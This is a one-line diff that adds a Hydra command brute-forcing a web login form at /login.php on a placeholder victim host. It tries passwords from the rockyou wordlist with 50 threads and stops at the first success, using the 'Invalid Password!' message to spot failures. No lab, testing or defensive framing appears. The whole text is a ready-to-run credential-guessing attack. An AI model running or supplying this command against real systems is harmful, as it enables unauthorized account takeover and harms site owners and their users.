@@ -1,0 +1,1 @@
+hydra VICTIM_IP -P /usr/share/wordlists/rockyou.txt -t 50 -f http-post-form "/login.php:user=^USER^&pass=^PASS^:Invalid Password!" -l USER 
